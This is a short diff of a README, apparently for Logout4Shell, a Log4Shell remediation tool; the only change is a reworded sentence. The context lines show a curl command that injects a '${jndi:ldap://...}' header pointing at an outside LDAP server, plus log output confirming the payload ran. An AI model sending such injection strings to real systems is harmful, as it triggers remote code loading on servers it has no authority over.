@@ -127,7 +127,7 @@ curl <Vulnerable_App_IP_Address>:443 -H 'X-Api-Version: ${jndi:ldap://<Logout4Sh
 ```
 HelloWorld                               : Received a request for API version ${jndi:ldap://XX.XX.XXX.XXX:1389/a}
 ```
-- If you scroll up in the same window you should receive the response below validating the Transient or Persistent payload was executed:
+- If you scroll up in the same window you should see the output below validating the Transient or Persistent payload was executed:
 ```
 Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True
 ````
